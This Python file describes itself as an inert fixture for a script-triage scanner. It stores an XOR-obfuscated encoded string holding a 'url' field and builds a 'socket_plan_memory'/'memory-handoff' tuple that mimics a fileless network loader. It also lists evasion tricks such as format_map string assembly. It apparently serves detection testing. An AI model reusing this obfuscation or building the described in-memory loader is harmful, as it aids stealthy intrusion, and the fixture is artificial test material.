#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_f5953132 = "208,237,223,163,208,164,193,177,194,255,158,253,140,249,144,226,135,216,170,207,162,205,185,220,240,148,253,142,254,159,235,136,224,191,210,183,218,181,199,190,194,163,199,166,214,162,199,181,136,251,148,247,156,249,141,210,162,206,175,193,158,243,150,251,148,230,159,227,144,228,133,226,135,216,187,212,161,207,187,134,183,203,184,193,175,219,186,194,255,147,250,137,253,162,193,174,195,179,193,164,204,169,199,180,221,178,220,160,207,173,203,190,205,174,207,187,210,189,211,238,136,231,149,248,153,237,178,223,190,206,178,209,176,194,176,217,188,206,243,132,236,137,236,128,223,190,204,175,199,174,216,189,193,182,223,177,213,186,205,190,225,130,234,139,226,140,177,193,174,217,188,206,189,213,176,220,176,239,155,244,171,219,162,214,190,209,191,195,160,193,172,220,189,212,179,221,130,235,143,178,209,176,221,173,204,165,194,172,129,180,128,178,129,224,129,185,138,190,219,167,210,160,204,241,153,237,153,233,154,160,143,160,149,161,147,160,193,160,152,171,159,250,212,177,201,168,197,181,217,188,146,251,149,227,130,238,135,227,204,254,154,255,198,160,144,163,193,239,159,230,154,239,156,249,139,212,181,210,183,217,173,144,216,173,195,183,197,160,211,160,240,137,253,149,250,148,187,142,186,136,187,218,187,131,176,132,225"
CODEC_f5953132 = "decimal_csv|rolling_xor|a6"

def load_f5953132():
    return bytes(int(item) for item in MATERIAL_f5953132.split(","))

def decode_f5953132(item1):
    item2 = bytearray()
    item5 = 166
    for value in item1:
        item2.append(value ^ item5)
        item5 = value
    return bytes(item2)

def recover_f5953132():
    item4 = None
    item6 = decode_f5953132
    item2 = item6(load_f5953132())
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_f5953132():
    return recover_f5953132()

def surface_f5953132():
    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

def obfuscation_f5953132():
    return "{left}{right}".format_map({"left": "format_", "right": "map"})

def plan_f5953132():
    fields = dict(item.split("=", 1) for item in inspect_f5953132().split("|"))
    analysis_surface = surface_f5953132()
    obfuscation_surface = obfuscation_f5953132()
    operation_plan = ("socket_plan_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_f5953132())
